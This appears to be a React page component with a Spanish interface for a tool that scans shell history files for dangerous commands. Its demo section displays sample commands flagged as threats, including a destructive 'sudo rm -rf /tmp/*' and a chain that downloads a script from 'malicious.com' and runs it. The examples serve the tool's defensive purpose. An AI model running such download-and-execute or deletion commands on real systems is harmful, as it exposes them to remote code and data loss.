import React, { useState } from 'react';
import { useAnalysis } from '../../context/AnalysisContext';
import FileUpload from '../../components/upload/FileUpload';
import TextInput from '../../components/upload/TextInput';
import AnalysisResults from '../../components/analysis/AnalysisResults';
import LoadingSpinner from '../../components/common/LoadingSpinner';
import ErrorAlert from '../../components/common/ErrorAlert';
import {
    DocumentArrowUpIcon,
    DocumentTextIcon,
    BeakerIcon,
    ClockIcon
} from '@heroicons/react/24/outline';

const Analysis = () => {
    const {
        analysisResult,
        isLoading,
        error,
        hasResult,
        analysisHistory,
        clearError
    } = useAnalysis();

    const [activeTab, setActiveTab] = useState('upload');

    const tabs = [
        {
            id: 'upload',
            name: 'Subir Archivo',
            icon: DocumentArrowUpIcon,
            description: 'Sube tu archivo de historial (.bash_history, .zsh_history, etc.)'
        },
        {
            id: 'text',
            name: 'Texto Directo',
            icon: DocumentTextIcon,
            description: 'Pega comandos directamente para analizar'
        },
        {
            id: 'demo',
            name: 'Demo',
            icon: BeakerIcon,
            description: 'Prueba con un análisis de demostración'
        }
    ];

    return (
        <div className="min-h-screen bg-gray-50 py-8">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                {/* Header */}
                <div className="text-center mb-8">
                    <h1 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                        Análisis de Historial de Terminal
                    </h1>
                    <p className="text-lg text-gray-600 max-w-3xl mx-auto">
                        Analiza tu historial de terminal para detectar comandos peligrosos y patrones sospechosos
                    </p>
                </div>

                {/* Error Alert */}
                {error && (
                    <div className="mb-6">
                        <ErrorAlert error={error} onClose={clearError} />
                    </div>
                )}

                {/* Main Content */}
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
                    {/* Left Column - Input Section */}
                    <div className="lg:col-span-1">
                        <div className="card">
                            {/* Tabs */}
                            <div className="border-b border-gray-200 mb-6">
                                <nav className="-mb-px flex space-x-8">
                                    {tabs.map((tab) => {
                                        const Icon = tab.icon;
                                        return (
                                            <button
                                                key={tab.id}
                                                onClick={() => setActiveTab(tab.id)}
                                                className={`py-2 px-1 border-b-2 font-medium text-sm flex items-center space-x-2 ${
                                                    activeTab === tab.id
                                                        ? 'border-primary-500 text-primary-600'
                                                        : 'border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300'
                                                }`}
                                            >
                                                <Icon className="h-4 w-4" />
                                                <span className="hidden sm:inline">{tab.name}</span>
                                            </button>
                                        );
                                    })}
                                </nav>
                            </div>

                            {/* Tab Content */}
                            <div className="mb-6">
                                <p className="text-sm text-gray-600 mb-4">
                                    {tabs.find(tab => tab.id === activeTab)?.description}
                                </p>

                                {activeTab === 'upload' && <FileUpload />}
                                {activeTab === 'text' && <TextInput />}
                                {activeTab === 'demo' && <DemoSection />}
                            </div>
                        </div>

                        {/* Analysis History */}
                        {analysisHistory.length > 0 && (
                            <div className="card mt-6">
                                <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
                                    <ClockIcon className="h-5 w-5 mr-2" />
                                    Historial de Análisis
                                </h3>
                                <div className="space-y-3 max-h-64 overflow-y-auto">
                                    {analysisHistory.map((item) => (
                                        <div
                                            key={item.id}
                                            className="border border-gray-200 rounded-lg p-3 hover:bg-gray-50 transition-colors duration-200"
                                        >
                                            <div className="flex justify-between items-start mb-2">
                                                <h4 className="font-medium text-sm text-gray-900 truncate">
                                                    {item.filename}
                                                </h4>
                                                <span className="text-xs text-gray-500">
                          {new Date(item.timestamp).toLocaleDateString()}
                        </span>
                                            </div>
                                            <div className="flex justify-between text-xs text-gray-600">
                                                <span>{item.totalCommands} comandos</span>
                                                <span>{getTotalThreats(item.threatCount)} amenazas</span>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}
                    </div>

                    {/* Right Column - Results Section */}
                    <div className="lg:col-span-2">
                        {isLoading && (
                            <div className="card text-center py-12">
                                <LoadingSpinner size="large" />
                                <p className="mt-4 text-lg text-gray-600">
                                    Analizando historial...
                                </p>
                                <p className="text-sm text-gray-500 mt-2">
                                    Esto puede tomar unos momentos
                                </p>
                            </div>
                        )}

                        {!isLoading && !hasResult && !error && (
                            <div className="card text-center py-12">
                                <BeakerIcon className="h-16 w-16 text-gray-400 mx-auto mb-4" />
                                <h3 className="text-lg font-medium text-gray-900 mb-2">
                                    Listo para analizar
                                </h3>
                                <p className="text-gray-600">
                                    Selecciona una opción de la izquierda para comenzar el análisis
                                </p>
                            </div>
                        )}

                        {!isLoading && hasResult && (
                            <AnalysisResults result={analysisResult} />
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
};

// Componente para la sección de demo
const DemoSection = () => {
    const { setLoading, setAnalysisResult, setError } = useAnalysis();
    const [isLoadingDemo, setIsLoadingDemo] = useState(false);

    const handleRunDemo = async () => {
        setIsLoadingDemo(true);
        setLoading(true);

        try {
            const { analysisService } = await import('../../services/api');
            const result = await analysisService.getDemoAnalysis();
            setAnalysisResult(result);
        } catch (error) {
            setError(error.message || 'Error al ejecutar el análisis de demostración');
        } finally {
            setIsLoadingDemo(false);
            setLoading(false);
        }
    };

    return (
        <div className="text-center">
            <div className="bg-gray-100 rounded-lg p-4 mb-4">
                <h4 className="font-medium text-gray-900 mb-2">Comandos de ejemplo:</h4>
                <div className="text-left space-y-1 text-sm font-mono text-gray-700">
                    <div>cd /home/user</div>
                    <div>ls -la</div>
                    <div className="text-red-600">sudo rm -rf /tmp/*</div>
                    <div className="text-orange-600">curl -o script.sh http://malicious.com</div>
                    <div className="text-red-600">chmod +x script.sh && ./script.sh</div>
                </div>
            </div>

            <button
                onClick={handleRunDemo}
                disabled={isLoadingDemo}
                className="btn-primary w-full"
            >
                {isLoadingDemo ? (
                    <>
                        <LoadingSpinner size="small" />
                        <span className="ml-2">Ejecutando demo...</span>
                    </>
                ) : (
                    'Ejecutar Análisis de Demo'
                )}
            </button>
        </div>
    );
};

// Función auxiliar para contar amenazas totales
const getTotalThreats = (threatCount) => {
    return Object.values(threatCount || {}).reduce((sum, count) => sum + count, 0);
};

export default Analysis;